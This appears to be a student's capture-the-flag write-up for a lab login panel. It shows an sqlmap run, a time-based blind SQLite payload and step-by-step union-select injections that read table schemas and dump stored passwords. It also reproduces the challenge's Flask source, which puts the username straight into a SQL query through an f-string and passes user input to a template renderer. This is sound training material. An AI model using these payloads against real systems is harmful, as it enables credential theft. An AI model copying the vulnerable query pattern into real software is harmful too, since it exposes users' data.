# Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))
###### tags: `CTF` `Web` `eductf`
Challenge: https://login.ctf.zoolab.org/

## Background

## Source Code

### Analysis

## Exploit - SQLi
### Easy way - `SQLmap`
```bash!
$ ./sqlmap.py "https://login.ctf.zoolab.org/" --form -dbs sqlite --dump --risk=3 --level=5
...
---
Parameter: username (POST)
    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: username='||(SELECT CHAR(116,86,90,89) WHERE 7681=7681 AND 7766=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'&password=
---
```
### Hard way - try&error
1. Check if it has `sqli` problem
Payload: `union'`
![](https://i.imgur.com/xIfsghR.png)

2. Try union based
Payload: `admin' union select 1 --` **→ WRONG**
Payload: `admin' union select 1,2 --` **→ WRONG**
Payload: `admin' union select 1,2,3 --` **→ WRONG**
Payload: `admin' union select 1,2,3,4 --`
![](https://i.imgur.com/3G8F2yP.png)
Obviously, it shows some info when select 4 values

3. Must know the metadata
According to the author, it used `sqlite` as its `DBMS`. As [kaibro cheat sheet](https://github.com/w181496/Web-CTF-Cheatsheet#sqlite)
    > 爆表名
    SELECT name FROM sqlite_master WHERE type='table'

    Then we can add this in our request
    Payload: `admin' union select 1,2,3,sql FROM sqlite_master WHERE type='table' --`
    ![](https://i.imgur.com/3OBjg43.png)

    Based on the info we leak, there's a table named `users` with <font color="FF0000">`id`, `username`, `password`,and `count`</font> 4 columns

4. Leak password
Payload: `admin' union select 1,2,3,password FROM users --`
![](https://i.imgur.com/p4d4Ep5.png)


## Result
Then we got source code!!!
:::spoiler code
```python=
from flask import Flask, request, render_template, render_template_string, send_file
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()
app = Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///app.db"
db.init_app(app)

with app.app_context():
  db.session.execute("""
    CREATE TABLE IF NOT EXISTS users(
      id Integer PRIMARY KEY,
      username String NOT NULL UNIQUE,
      password String,
      count Integer DEFAULT 0
    );
  """)
  db.session.execute("INSERT OR REPLACE INTO users (username, password) VALUES ('admin', 'FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}')")
  db.session.commit()

def login(greet):
  if not greet:
    return send_file('app.py', mimetype='text/plain')
  else:
    return render_template_string(f"Hello {greet}")

@app.route('/', methods=["GET", "POST"])
def index():
  if request.method == "GET":
    return render_template('index.html')
  else:
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    error = ''
    user = db.session.execute("SELECT username, password FROM users where username=:username", {"username":username}).first()

    if user and user[1] == password:
      return login(request.form.get('greet', ''))
    elif not user:
      error += "User doesn't exist! "

    # New feature! count login failed event
    db.session.execute("UPDATE users SET count = count + 1 WHERE username=:username", {"username": username})
    db.session.commit()
    count = db.session.execute(f"SELECT * FROM users WHERE username='{username}'").first() or [0, 0, 0, 0]
    error += f'Login faild count: {count[3]}'

    return render_template('index.html', error=error)


if __name__ == "__main__":
  app.run(host="0.0.0.0")
```
:::
